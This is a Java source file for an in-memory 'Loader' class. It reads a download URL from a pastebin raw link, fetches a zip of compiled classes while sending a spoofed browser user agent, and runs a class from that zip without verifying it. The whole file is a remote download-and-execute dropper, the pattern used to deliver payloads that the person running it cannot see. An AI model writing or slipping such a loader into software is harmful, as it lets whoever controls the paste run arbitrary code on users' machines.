package com.cj.loader;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Loader {
    public static void main() {
        try {
            ByteLoader loader = new ByteLoader();
            URL pastebin = new URL("https://pastebin.com/raw/DvUc3HXa");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream inputStream = httpURLConnection.getInputStream();
            ZipInputStream zipInputStream = new ZipInputStream(inputStream);
            ZipEntry zipEntry;

            while ((zipEntry = zipInputStream.getNextEntry()) != null) {
                String name = zipEntry.getName();
                if (!name.endsWith(".class"))
                    continue;
                name = name.substring(0, name.length() - 6);
                name = name.replace('/', '.');
                ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
                byte[] tempBuffer = new byte[16384];
                int bytesRead;
                for (;
                     (bytesRead = zipInputStream.read(tempBuffer)) != -1; streamBuilder.write(tempBuffer, 0, bytesRead));
                loader.classes.put(name, streamBuilder.toByteArray());
            }
            loader.findClass("hello.world.Main").getMethod("run", new Class[0]).invoke(null, new Object[0]);
        } catch (Exception exception) {
            System.out.println(exception);
        }
    }

}
